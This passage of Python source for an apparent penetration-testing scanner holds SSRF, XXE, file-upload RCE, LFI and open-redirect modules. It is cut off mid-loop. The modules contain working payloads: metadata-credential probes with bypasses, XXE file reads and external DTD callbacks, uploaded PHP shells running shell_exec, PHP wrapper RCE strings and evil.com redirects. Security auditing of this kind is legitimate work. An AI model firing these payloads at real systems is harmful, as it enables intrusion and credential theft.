"""
Server-Side vulnerability modules — Sprint 4 Phase 2.
Modules: SS-01 SSRF, SS-02 XXE, SS-03 File Upload RCE,
         SS-05 Path Traversal/LFI, SS-07 Open Redirect, SS-08 SSTI→RCE
"""
from __future__ import annotations
from apps.modules.engine import BaseModule, FieldSchema
from apps.modules.runner import ToolRunner


# ─── [SS-01] SSRF ─────────────────────────────────────────────────────────────

class SSRFModule(BaseModule):
    id = "SS-01"
    name = "SSRF"
    category = "server_side"
    description = (
        "Full SSRF detection suite: probe internal metadata, localhost ports, "
        "cloud provider endpoints, and OOB callbacks via interactsh."
    )
    risk_level = "critical"
    tags = ["ssrf", "oob", "aws-metadata", "interactsh", "bypass"]
    celery_queue = "web_audit_queue"
    time_limit = 300

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://api.example.com/fetch?url=",
            help_text="URL with a parameter that fetches a URL (the SSRF injection point).",
        ),
        FieldSchema(
            key="method",
            label="Method",
            field_type="select",
            default="GET",
            options=[{"value": "GET", "label": "GET"}, {"value": "POST", "label": "POST"}],
        ),
        FieldSchema(
            key="parameter",
            label="SSRF Parameter Name",
            field_type="text",
            required=True,
            placeholder="url",
        ),
        FieldSchema(
            key="probe_targets",
            label="Probe Targets",
            field_type="checkbox_group",
            default=["aws_meta", "localhost", "internal"],
            options=[
                {"value": "aws_meta",  "label": "AWS metadata (169.254.169.254)"},
                {"value": "gcp_meta",  "label": "GCP metadata (metadata.google.internal)"},
                {"value": "azure_meta","label": "Azure metadata (169.254.169.254/metadata)"},
                {"value": "localhost", "label": "Localhost + common ports"},
                {"value": "internal",  "label": "Private IP ranges (192.168.x, 10.x)"},
                {"value": "oob",       "label": "OOB / interactsh callback"},
            ],
        ),
        FieldSchema(
            key="oast_domain",
            label="OAST Callback Domain",
            field_type="text",
            required=False,
            placeholder="xxxx.oast.fun",
            oast_callback=True,
            show_if={"probe_targets": "oob"},
        ),
        FieldSchema(
            key="bypass_techniques",
            label="Bypass Techniques",
            field_type="checkbox_group",
            default=["url_encode", "ip_variants"],
            options=[
                {"value": "url_encode",  "label": "URL encoding"},
                {"value": "ip_variants", "label": "IP octal/decimal/hex forms"},
                {"value": "redirect",    "label": "30x redirect chain"},
                {"value": "ipv6",        "label": "IPv6 representation"},
            ],
        ),
        FieldSchema(
            key="auth_cookie",
            label="Auth Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123",
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    _META_PATHS = {
        "aws_meta": [
            "http://169.254.169.254/latest/meta-data/",
            "http://169.254.169.254/latest/meta-data/iam/security-credentials/",
        ],
        "gcp_meta": [
            "http://metadata.google.internal/computeMetadata/v1/",
        ],
        "azure_meta": [
            "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
        ],
        "localhost": [
            "http://localhost/",
            "http://127.0.0.1/",
            "http://127.0.0.1:8080/",
            "http://127.0.0.1:8443/",
            "http://127.0.0.1:9200/",
            "http://127.0.0.1:6379/",
        ],
        "internal": [
            "http://192.168.0.1/",
            "http://10.0.0.1/",
            "http://172.16.0.1/",
        ],
    }

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3
        import urllib.parse

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        url = params["target_url"]
        method = params.get("method", "GET")
        param = params["parameter"]
        probes = params.get("probe_targets", ["aws_meta", "localhost"])
        bypass = params.get("bypass_techniques", [])
        oast = params.get("oast_domain", "").strip()
        findings = []

        headers = {"User-Agent": "PenTools/SSRF"}
        if params.get("auth_cookie"):
            headers["Cookie"] = params["auth_cookie"]

        parsed = urllib.parse.urlparse(url)
        existing_qs = dict(urllib.parse.parse_qsl(parsed.query))

        def make_req(probe_url: str) -> requests.Response | None:
            try:
                if method == "GET":
                    qs = {**existing_qs, param: probe_url}
                    req_url = urllib.parse.urlunparse(parsed._replace(query=urllib.parse.urlencode(qs)))
                    resp = requests.get(req_url, headers=headers, timeout=12, verify=verify, allow_redirects=True)
                else:
                    resp = requests.post(url, data={param: probe_url}, headers=headers, timeout=12, verify=verify)
                return resp
            except Exception as e:
                stream("warning", f"Request failed: {e}")
                return None

        _SSRF_KEYWORDS = (
            "ami-id", "iam/security-credentials", "computeMetadata",
            "root:", "localhost", "127.0.0.1", "instance-id",
            "accountId", "imageId", "subscriptionId",
        )

        for probe_type in probes:
            if probe_type == "oob":
                if oast:
                    stream("info", f"Sending OOB SSRF probe to {oast}")
                    resp = make_req(f"http://{oast}/ssrf-probe")
                    if resp:
                        stream("info", f"OOB SSRF probe sent: HTTP {resp.status_code}")
                        findings.append({
                            "title": "SSRF — OOB Probe Sent",
                            "severity": "info",
                            "url": url,
                            "description": f"OOB SSRF probe sent to {oast}. Monitor for incoming callbacks.",
                            "evidence": f"Param: {param}\nCallback: http://{oast}/ssrf-probe",
                            "remediation": "Implement strict URL allowlist validation before server-side fetch.",
                            "cwe_id": "CWE-918",
                        })
                continue

            for probe_url in self._META_PATHS.get(probe_type, []):
                stream("info", f"Probing {probe_type}: {probe_url}")

                # Build bypass variants
                probe_list = [probe_url]
                if "url_encode" in bypass:
                    probe_list.append(urllib.parse.quote(probe_url, safe=""))
                if "ip_variants" in bypass and "169.254.169.254" in probe_url:
                    # Decimal: 2852039166, Octal: 0251.0376.0251.0376
                    probe_list.append(probe_url.replace("169.254.169.254", "2852039166"))
                    probe_list.append(probe_url.replace("169.254.169.254", "0251.0376.0251.0376"))
                if "ipv6" in bypass and "127.0.0.1" in probe_url:
                    probe_list.append(probe_url.replace("127.0.0.1", "[::1]"))
                    probe_list.append(probe_url.replace("127.0.0.1", "0:0:0:0:0:ffff:7f00:1"))

                for purl in probe_list:
                    resp = make_req(purl)
                    if not resp:
                        continue
                    stream("info", f"  → HTTP {resp.status_code}, {len(resp.text)} bytes")

                    if resp.status_code == 200 and any(k in resp.text for k in _SSRF_KEYWORDS):
                        stream("success", f"SSRF CONFIRMED: {probe_type} at {purl}")
                        findings.append({
                            "title": f"SSRF — {probe_type.replace('_', ' ').title()} Confirmed",
                            "severity": "critical",
                            "url": url,
                            "description": (
                                f"Server-Side Request Forgery confirmed — the server fetched "
                                f"{purl} and the response contains internal metadata."
                            ),
                            "evidence": f"Probe URL: {purl}\nHTTP {resp.status_code}\nResponse: {resp.text[:500]}",
                            "remediation": (
                                "Implement a strict URL allowlist. Block private IP ranges "
                                "(RFC 1918) and cloud metadata endpoints. Disable HTTP redirects."
                            ),
                            "cwe_id": "CWE-918",
                        })
                        break

        stream("info", f"SSRF scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [SS-02] XXE Injection ────────────────────────────────────────────────────

class XXEInjectionModule(BaseModule):
    id = "SS-02"
    name = "XXE Injection"
    category = "server_side"
    description = (
        "Test XML endpoints for XXE vulnerabilities: classic file read, "
        "blind OOB via DTD, XInclude, and error-based extraction."
    )
    risk_level = "critical"
    tags = ["xxe", "xml", "oob", "file-read", "owasp-a05"]
    celery_queue = "web_audit_queue"
    time_limit = 240

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/api/parse",
        ),
        FieldSchema(
            key="xml_body",
            label="XML Request Body (with FUZZ placeholder)",
            field_type="json_editor",
            required=False,
            placeholder='<?xml version="1.0"?><root><data>FUZZ</data></root>',
            help_text="Optionally include a 'FUZZ' placeholder where entities will be injected.",
        ),
        FieldSchema(
            key="attack_types",
            label="XXE Attack Vectors",
            field_type="checkbox_group",
            default=["classic", "blind_oob", "xinclude"],
            options=[
                {"value": "classic",    "label": "Classic XXE (file:///etc/passwd)"},
                {"value": "blind_oob",  "label": "Blind OOB via external DTD"},
                {"value": "xinclude",   "label": "XInclude file read"},
                {"value": "error_based","label": "Error-based extraction"},
                {"value": "ssrf",       "label": "SSRF via XXE (http:// entity)"},
            ],
        ),
        FieldSchema(
            key="oast_domain",
            label="OAST Domain (for blind OOB)",
            field_type="text",
            required=False,
            placeholder="xxxx.oast.fun",
            oast_callback=True,
            show_if={"attack_types": "blind_oob"},
        ),
        FieldSchema(
            key="target_file",
            label="File to Read",
            field_type="text",
            default="/etc/passwd",
            placeholder="/etc/passwd",
        ),
        FieldSchema(
            key="auth_cookie",
            label="Auth Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123",
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        url = params["target_url"]
        attacks = params.get("attack_types", ["classic", "blind_oob"])
        target_file = params.get("target_file", "/etc/passwd")
        oast = params.get("oast_domain", "").strip()
        findings = []

        headers = {
            "Content-Type": "application/xml",
            "User-Agent": "PenTools/XXE",
        }
        if params.get("auth_cookie"):
            headers["Cookie"] = params["auth_cookie"]

        raw_xml = params.get("xml_body", "").strip() or f'<?xml version="1.0"?><root><data>FUZZ</data></root>'

        def post_xml(body: str, label: str):
            try:
                resp = requests.post(url, data=body.encode(), headers=headers,
                                     timeout=15, verify=verify)
                stream("info", f"{label}: HTTP {resp.status_code}")
                return resp
            except Exception as e:
                stream("warning", f"Request failed ({label}): {e}")
                return None

        _XXE_FILE_INDICATORS = ("root:", "daemon:", "bin:", "/etc/", "nobody:", "www-data:")
        _XXE_ERROR_INDICATORS = ("xmlParseEntityRef", "SAXParseException", "javax.xml.transform",
                                 "DocumentBuilder", "org.xml.sax", "Invalid byte")

        if "classic" in attacks:
            xxe_classic = (
                f'<?xml version="1.0" encoding="UTF-8"?>'
                f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{target_file}">]>'
                f'<root><data>&xxe;</data></root>'
            )
            resp = post_xml(xxe_classic, "Classic XXE")
            if resp:
                if any(k in resp.text for k in _XXE_FILE_INDICATORS):
                    stream("success", "Classic XXE confirmed — file contents in response!")
                    findings.append({
                        "title": "XXE — Classic File Read Confirmed",
                        "severity": "critical",
                        "url": url,
                        "description": f"XXE allows reading server files. Target: {target_file}",
                        "evidence": f"Response snippet: {resp.text[:500]}",
                        "remediation": "Disable external entity processing in XML parser. FEATURE_EXTERNAL_GENERAL_ENTITIES=false.",
                        "cwe_id": "CWE-611",
                    })
                elif any(k in resp.text for k in _XXE_ERROR_INDICATORS):
                    stream("info", "XXE parser error response — may be vulnerable (blind)")
                    findings.append({
                        "title": "XXE — Parser Response Detected (Potential)",
                        "severity": "medium",
                        "url": url,
                        "description": "XML parser error detected in response, indicating XML is parsed. Escalate with blind/OOB techniques.",
                        "evidence": resp.text[:300],
                        "remediation": "Disable external entity processing.",
                        "cwe_id": "CWE-611",
                    })

        if "blind_oob" in attacks and oast:
            stream("info", f"Sending blind OOB XXE probe to {oast}")
            xxe_oob = (
                f'<?xml version="1.0" encoding="UTF-8"?>'
                f'<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://{oast}/xxe.dtd">%xxe;]>'
                f'<root><data>test</data></root>'
            )
            resp = post_xml(xxe_oob, "Blind OOB XXE")
            if resp:
                findings.append({
                    "title": "XXE — Blind OOB Probe Sent",
                    "severity": "info",
                    "url": url,
                    "description": f"OOB XXE probe sent to {oast}. Monitor for DNS/HTTP callbacks.",
                    "evidence": f"DTD URL: http://{oast}/xxe.dtd\nHTTP {resp.status_code}",
                    "remediation": "Disable external entity and DTD processing.",
                    "cwe_id": "CWE-611",
                })

        if "xinclude" in attacks:
            stream("info", "Testing XInclude XXE")
            xinclude_body = (
                f'<?xml version="1.0"?>'
                f'<root xmlns:xi="http://www.w3.org/2001/XInclude">'
                f'<xi:include parse="text" href="file://{target_file}"/>'
                f'</root>'
            )
            resp = post_xml(xinclude_body, "XInclude")
            if resp and any(k in resp.text for k in _XXE_FILE_INDICATORS):
                stream("success", "XInclude XXE confirmed!")
                findings.append({
                    "title": "XXE — XInclude File Read",
                    "severity": "critical",
                    "url": url,
                    "description": f"XInclude processed and returned {target_file} contents.",
                    "evidence": resp.text[:400],
                    "remediation": "Disable XInclude processing. Sanitize XML input before parsing.",
                    "cwe_id": "CWE-611",
                })

        if "ssrf" in attacks:
            stream("info", "Testing XXE → SSRF via http:// entity")
            xxe_ssrf = (
                '<?xml version="1.0" encoding="UTF-8"?>'
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>'
                '<root><data>&xxe;</data></root>'
            )
            resp = post_xml(xxe_ssrf, "XXE SSRF")
            if resp and ("ami-id" in resp.text or "instance-id" in resp.text):
                stream("success", "XXE → SSRF confirmed via AWS metadata!")
                findings.append({
                    "title": "XXE → SSRF — AWS Metadata Accessed",
                    "severity": "critical",
                    "url": url,
                    "description": "XXE entity resolved to AWS metadata endpoint, confirming XXE-based SSRF.",
                    "evidence": resp.text[:400],
                    "remediation": "Disable external entity processing. Block access to metadata endpoints at network level.",
                    "cwe_id": "CWE-611",
                })

        stream("info", f"XXE scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [SS-03] File Upload RCE ──────────────────────────────────────────────────

class FileUploadRCEModule(BaseModule):
    id = "SS-03"
    name = "File Upload — RCE"
    category = "server_side"
    description = (
        "Test file upload endpoints for Remote Code Execution via extension bypass, "
        "MIME spoofing, .htaccess upload, double extension, and image polyglot techniques."
    )
    risk_level = "critical"
    tags = ["file-upload", "rce", "extension-bypass", "mime-spoof", "htaccess"]
    celery_queue = "web_audit_queue"
    time_limit = 300

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="upload_url",
            label="Upload Endpoint",
            field_type="url",
            required=True,
            placeholder="https://example.com/api/upload",
        ),
        FieldSchema(
            key="file_param",
            label="File Input Field Name",
            field_type="text",
            default="file",
        ),
        FieldSchema(
            key="retrieve_base_url",
            label="Base URL where files are served",
            field_type="url",
            required=False,
            placeholder="https://example.com/uploads/",
            help_text="If response contains URL, leave empty.",
        ),
        FieldSchema(
            key="bypass_techniques",
            label="Bypass Techniques",
            field_type="checkbox_group",
            default=["double_ext", "mime_spoof", "null_byte", "htaccess"],
            options=[
                {"value": "double_ext",  "label": "Double extension (.php.jpg)"},
                {"value": "mime_spoof",  "label": "MIME type spoof (image/jpeg for .php)"},
                {"value": "null_byte",   "label": "Null byte injection (.php%00.jpg)"},
                {"value": "htaccess",    "label": ".htaccess upload (SetHandler)"},
                {"value": "phtml",       "label": ".phtml / .phar / .php5 variants"},
                {"value": "polyglot",    "label": "Image polyglot (GIF header + PHP)"},
            ],
        ),
        FieldSchema(
            key="shell_marker",
            label="Shell Execution Marker",
            field_type="text",
            default="PENTOOLS_RCE_MARKER",
            help_text="String that will appear in the output if PHP is executed.",
        ),
        FieldSchema(
            key="auth_type",
            label="Auth",
            field_type="select",
            default="none",
            options=[
                {"value": "none",       "label": "No Auth"},
                {"value": "cookie",     "label": "Cookie"},
                {"value": "bearer_jwt", "label": "Bearer JWT"},
            ],
        ),
        FieldSchema(
            key="auth_value",
            label="Cookie / Token",
            field_type="text",
            required=False,
            sensitive=True,
            show_if={"auth_type": "cookie"},
        ),
        FieldSchema(
            key="jwt_token",
            label="Bearer JWT",
            field_type="textarea",
            required=False,
            sensitive=True,
            show_if={"auth_type": "bearer_jwt"},
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3
        import re

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        upload_url = params["upload_url"]
        file_param = params.get("file_param", "file")
        retrieve_base = params.get("retrieve_base_url", "").rstrip("/")
        techniques = params.get("bypass_techniques", ["double_ext", "mime_spoof"])
        marker = params.get("shell_marker", "PENTOOLS_RCE_MARKER")
        findings = []

        headers: dict[str, str] = {"User-Agent": "PenTools/UploadRCE"}
        auth_type = params.get("auth_type", "none")
        if auth_type == "cookie" and params.get("auth_value"):
            headers["Cookie"] = params["auth_value"]
        elif auth_type == "bearer_jwt" and params.get("jwt_token"):
            headers["Authorization"] = f"Bearer {params['jwt_token'].strip()}"

        shell_content = f'<?php echo "{marker}"; echo shell_exec("id"); ?>'.encode()
        gif_header = b"GIF89a" + shell_content  # Polyglot: GIF header + PHP

        # (filename, content, content_type, label)
        uploads: list[tuple[str, bytes, str, str]] = []

        if "double_ext" in techniques:
            uploads.append(("shell.php.jpg", shell_content, "image/jpeg", "Double extension .php.jpg"))
            uploads.append(("shell.jpg.php", shell_content, "application/octet-stream", "Reversed .jpg.php"))

        if "mime_spoof" in techniques:
            uploads.append(("shell.php", shell_content, "image/jpeg", "MIME spoof image/jpeg for .php"))
            uploads.append(("shell.php", shell_content, "image/png", "MIME spoof image/png for .php"))

        if "null_byte" in techniques:
            uploads.append(("shell.php\x00.jpg", shell_content, "image/jpeg", "Null byte .php\\0.jpg"))

        if "htaccess" in techniques:
            htaccess = b"AddType application/x-httpd-php .jpg\n"
            uploads.append((".htaccess", htaccess, "text/plain", ".htaccess SetHandler"))
            uploads.append(("shell.jpg", shell_content, "image/jpeg", "JPG after .htaccess upload"))

        if "phtml" in techniques:
            for ext in [".phtml", ".phar", ".php5", ".php7", ".shtml"]:
                uploads.append((f"shell{ext}", shell_content, "image/jpeg", f"Extension {ext}"))

        if "polyglot" in techniques:
            uploads.append(("polyglot.php.gif", gif_header, "image/gif", "Polyglot GIF+PHP"))

        def try_upload(fname: str, content: bytes, mime: str, label: str) -> str | None:
            """Returns the served URL if upload succeeded."""
            try:
                files_dict = {file_param: (fname, content, mime)}
                resp = requests.post(upload_url, files=files_dict, headers=headers,
                                     timeout=20, verify=verify)
                stream("info", f"{label}: HTTP {resp.status_code}")
                if resp.status_code in (200, 201):
                    # Try to find URL in response
                    url_match = re.search(r'https?://[^\s"\'<>]+' + re.escape(fname.split(".")[0]), resp.text)
                    if url_match:
                        return url_match.group(0)
                    if retrieve_base:
                        return f"{retrieve_base}/{fname}"
                return None
            except Exception as e:
                stream("warning", f"Upload failed ({label}): {e}")
                return None

        def check_execution(served_url: str, label: str) -> bool:
            try:
                resp = requests.get(served_url, headers=headers, timeout=12, verify=verify)
                if marker in resp.text or "uid=" in resp.text:
                    stream("success", f"RCE CONFIRMED via {label}: {served_url}")
                    return True
                return False
            except Exception:
                return False

        for fname, content, mime, label in uploads:
            stream("info", f"Trying upload bypass: {label}")
            served_url = try_upload(fname, content, mime, label)
            if served_url:
                if check_execution(served_url, label):
                    findings.append({
                        "title": f"File Upload RCE — {label}",
                        "severity": "critical",
                        "url": served_url,
                        "description": (
                            f"Remote code execution confirmed via file upload bypass ({label}). "
                            f"The server executed uploaded PHP and returned the marker + id output."
                        ),
                        "evidence": f"Upload URL: {upload_url}\nServed at: {served_url}\nTechnique: {label}",
                        "remediation": (
                            "Validate file type by magic bytes (not extension or MIME header). "
                            "Serve uploads from a separate non-executable domain. "
                            "Rename files on upload. Block .htaccess uploads."
                        ),
                        "cwe_id": "CWE-434",
                    })
                else:
                    stream("info", f"{label}: file served but no code execution")

        stream("info", f"File upload RCE scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [SS-05] Path Traversal / LFI ────────────────────────────────────────────

class PathTraversalLFIModule(BaseModule):
    id = "SS-05"
    name = "Path Traversal / LFI"
    category = "server_side"
    description = (
        "Test for path traversal and LFI vulnerabilities using ffuf with dotdot wordlist. "
        "Also tests PHP wrappers: php://filter, php://input, expect://, data://."
    )
    risk_level = "high"
    tags = ["lfi", "path-traversal", "php-wrappers", "ffuf", "dotdot"]
    celery_queue = "web_audit_queue"
    time_limit = 360

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL (put FUZZ in path param)",
            field_type="url",
            required=True,
            placeholder="https://example.com/page?file=FUZZ",
            help_text="Include FUZZ where the file parameter goes. Used with ffuf.",
        ),
        FieldSchema(
            key="method",
            label="Method",
            field_type="select",
            default="GET",
            options=[{"value": "GET", "label": "GET"}, {"value": "POST", "label": "POST"}],
        ),
        FieldSchema(
            key="post_data",
            label="POST Data (with FUZZ)",
            field_type="text",
            required=False,
            placeholder="file=FUZZ",
            show_if={"method": "POST"},
        ),
        FieldSchema(
            key="attack_types",
            label="Attack Vectors",
            field_type="checkbox_group",
            default=["dotdot", "php_filter", "php_data"],
            options=[
                {"value": "dotdot",     "label": "../ path traversal (ffuf)"},
                {"value": "php_filter", "label": "PHP php://filter wrapper"},
                {"value": "php_input",  "label": "PHP php://input wrapper"},
                {"value": "php_data",   "label": "PHP data:// wrapper"},
                {"value": "expect",     "label": "PHP expect:// (RCE)"},
                {"value": "null_byte",  "label": "Null byte truncation"},
            ],
        ),
        FieldSchema(
            key="target_files",
            label="Target Files (dotdot scan)",
            field_type="checkbox_group",
            default=["etc_passwd", "etc_hosts", "proc_self"],
            options=[
                {"value": "etc_passwd",   "label": "/etc/passwd"},
                {"value": "etc_hosts",    "label": "/etc/hosts"},
                {"value": "win_system32", "label": "C:/Windows/System32/drivers/etc/hosts"},
                {"value": "proc_self",    "label": "/proc/self/environ"},
            ],
        ),
        FieldSchema(
            key="auth_cookie",
            label="Auth Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123",
        ),
        FieldSchema(
            key="threads",
            label="Threads (ffuf)",
            field_type="range_slider",
            default=20,
            min_value=5,
            max_value=100,
            step=5,
            group="advanced",
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    _TARGET_FILE_MAP = {
        "etc_passwd":   "/etc/passwd",
        "etc_hosts":    "/etc/hosts",
        "win_system32": "C:/Windows/System32/drivers/etc/hosts",
        "proc_self":    "/proc/self/environ",
    }

    _TRAVERSAL_PATTERNS = [
        "../", "..\\", "....//", "....\\\\",
        "%2e%2e/", "%2e%2e\\", "%2e%2e%2f",
        "..%252f", "..%c0%af", "..%c1%9c",
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3
        import urllib.parse

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        url = params["target_url"]
        attacks = params.get("attack_types", ["dotdot", "php_filter"])
        target_files_keys = params.get("target_files", ["etc_passwd"])
        findings = []

        headers = {"User-Agent": "PenTools/LFI"}
        if params.get("auth_cookie"):
            headers["Cookie"] = params["auth_cookie"]

        # Remove FUZZ for direct probes
        base_url = url.replace("FUZZ", "")
        parsed = urllib.parse.urlparse(url)

        def probe_url(payload: str) -> requests.Response | None:
            try:
                probed = url.replace("FUZZ", urllib.parse.quote(payload, safe=""))
                resp = requests.get(probed, headers=headers, timeout=12, verify=verify)
                return resp
            except Exception as e:
                stream("warning", f"Request failed: {e}")
                return None

        _LFI_INDICATORS = ("root:", "daemon:", "bin:", "SHELL=", "PATH=", "USER=", "/bin/bash", "nobody")

        if "dotdot" in attacks:
            stream("info", "Testing dotdot path traversal sequences")
            for file_key in target_files_keys:
                target = self._TARGET_FILE_MAP.get(file_key, "/etc/passwd")
                depth_range = range(2, 9)
                for sep in ["../", "..\\", "%2e%2e/"]:
                    for depth in depth_range:
                        payload = sep * depth + target.lstrip("/")
                        resp = probe_url(payload)
                        if resp and resp.status_code == 200 and any(k in resp.text for k in _LFI_INDICATORS):
                            stream("success", f"Path traversal confirmed: {payload}")
                            findings.append({
                                "title": f"Path Traversal — {target}",
                                "severity": "high",
                                "url": url.replace("FUZZ", urllib.parse.quote(payload, safe="")),
                                "description": f"Path traversal payload read {target} from server.",
                                "evidence": f"Payload: {payload}\nResponse: {resp.text[:400]}",
                                "remediation": "Canonicalize and validate file paths server-side. Use realpath() and check against allowed base path.",
                                "cwe_id": "CWE-22",
                            })
                            break
                    else:
                        continue
                    break

        if "php_filter" in attacks:
            stream("info", "Testing PHP php://filter wrapper")
            for file_key in target_files_keys:
                target = self._TARGET_FILE_MAP.get(file_key, "/etc/passwd")
                payload = f"php://filter/convert.base64-encode/resource={target}"
                resp = probe_url(payload)
                if resp and resp.status_code == 200 and len(resp.text) > 50:
                    import base64
                    # Check if response is base64-decodable to something file-like
                    try:
                        decoded = base64.b64decode(resp.text.strip()).decode("utf-8", errors="replace")
                        if any(k in decoded for k in _LFI_INDICATORS):
                            stream("success", "PHP filter wrapper LFI confirmed!")
                            findings.append({
                                "title": "LFI via PHP php://filter",
                                "severity": "critical",
                                "url": url,
                                "description": f"PHP filter wrapper used to read {target} as base64.",
                                "evidence": f"Decoded: {decoded[:300]}",
                                "remediation": "Never pass user input to file inclusion functions (include/require). Disable PHP wrappers if not needed.",
                                "cwe_id": "CWE-98",
                            })
                    except Exception:
                        pass

        if "php_data" in attacks:
            stream("info", "Testing PHP data:// wrapper")
            payload = "data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJ2lkJyk7Pz4="  # <?php echo system('id');?>
            resp = probe_url(payload)
            if resp and ("uid=" in resp.text or "root" in resp.text):
                stream("success", "PHP data:// wrapper RCE confirmed!")
                findings.append({
                    "title": "LFI/RCE via PHP data:// Wrapper",
                    "severity": "critical",
                    "url": url,
                    "description": "PHP data:// wrapper executed arbitrary PHP code.",
                    "evidence": resp.text[:300],
                    "remediation": "Disable allow_url_include. Sanitize file input.",
                    "cwe_id": "CWE-98",
                })

        if "expect" in attacks:
            stream("info", "Testing PHP expect:// wrapper (RCE)")
            payload = "expect://id"
            resp = probe_url(payload)
            if resp and ("uid=" in resp.text):
                stream("success", "PHP expect:// wrapper RCE!")
                findings.append({
                    "title": "RCE via PHP expect:// Wrapper",
                    "severity": "critical",
                    "url": url,
                    "description": "PHP expect:// wrapper executed OS command (id) — full RCE.",
                    "evidence": resp.text[:300],
                    "remediation": "Disable expect extension. Never allow user-controlled file inclusion.",
                    "cwe_id": "CWE-98",
                })

        if "null_byte" in attacks:
            stream("info", "Testing null byte truncation")
            for file_key in target_files_keys:
                target = self._TARGET_FILE_MAP.get(file_key, "/etc/passwd")
                payload = target + "\x00.jpg"
                resp = probe_url(payload)
                if resp and any(k in resp.text for k in _LFI_INDICATORS):
                    findings.append({
                        "title": "LFI via Null Byte Truncation",
                        "severity": "high",
                        "url": url,
                        "description": f"Null byte before extension truncated .jpg suffix, reading {target}.",
                        "evidence": resp.text[:300],
                        "remediation": "Never use null-terminated string handling in file path operations.",
                        "cwe_id": "CWE-626",
                    })

        stream("info", f"Path traversal/LFI scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [SS-07] Open Redirect ────────────────────────────────────────────────────

class OpenRedirectModule(BaseModule):
    id = "SS-07"
    name = "Open Redirect"
    category = "server_side"
    description = (
        "Detect open redirect vulnerabilities across common redirect parameters. "
        "Tests 302 chain scenarios that can be abused for token theft and phishing."
    )
    risk_level = "medium"
    tags = ["open-redirect", "302-chain", "phishing", "token-theft", "owasp-a01"]
    celery_queue = "web_audit_queue"
    time_limit = 180

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/login?next=/dashboard",
            help_text="URL with a redirect parameter (e.g., ?next=, ?redirect=, ?url=).",
        ),
        FieldSchema(
            key="redirect_params",
            label="Redirect Parameter Names to Test",
            field_type="textarea",
            required=False,
            default="next\nreturn\nreturn_to\nredirect\nredirect_to\nurl\npath\ncontinue\ndest\ndestination\nrurl\nforward\nreturnUrl\nreturnURL\ncallback\ngo\nout\nview\n",
            help_text="One parameter per line. Each will be fuzzed.",
        ),
        FieldSchema(
            key="attack_url",
            label="Attacker URL (redirect target)",
            field_type="url",
            default="https://evil.com",
            placeholder="https://evil.com",
        ),
        FieldSchema(
            key="bypass_techniques",
            label="Bypass Techniques",
            field_type="checkbox_group",
            default=["url_encode", "double_slash", "protocol_relative"],
            options=[
                {"value": "url_encode",       "label": "URL encoding"},
                {"value": "double_slash",     "label": "//evil.com (protocol-relative)"},
                {"value": "protocol_relative","label": "///evil.com"},
                {"value": "no_http",          "label": "\\\\evil.com"},
                {"value": "open_at",          "label": "@evil.com"},
            ],
        ),
        FieldSchema(
            key="auth_cookie",
            label="Auth Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123",
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3
        import urllib.parse

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        url = params["target_url"]
        attack_url = params.get("attack_url", "https://evil.com")
        bypass = params.get("bypass_techniques", ["url_encode", "double_slash"])
        findings = []

        headers = {"User-Agent": "PenTools/OpenRedirect"}
        if params.get("auth_cookie"):
            headers["Cookie"] = params["auth_cookie"]

        raw_params = params.get("redirect_params", "next\nreturn\nredirect\nurl")
        test_params = [p.strip() for p in raw_params.splitlines() if p.strip()]

        # Build payload list
        payloads: list[tuple[str, str]] = [(attack_url, "Direct URL")]
        if "url_encode" in bypass:
            payloads.append((urllib.parse.quote(attack_url, safe=""), "URL encoded"))
        if "double_slash" in bypass:
            payloads.append(("//evil.com", "Protocol-relative //"))
            payloads.append(("///evil.com", "Triple slash ///"))
        if "protocol_relative" in bypass:
            payloads.append(("//evil.com/%2f..", "Path confusion"))
        if "no_http" in bypass:
            payloads.append(("\\\\evil.com", "Backslash \\\\"))
            payloads.append(("/\\evil.com", "Mixed slash /\\"))
        if "open_at" in bypass:
            payloads.append((f"https://example.com@evil.com", "@-sign injection"))

        parsed = urllib.parse.urlparse(url)

        for test_param in test_params:
            for payload, label in payloads:
                try:
                    existing_qs = dict(urllib.parse.parse_qsl(parsed.query))
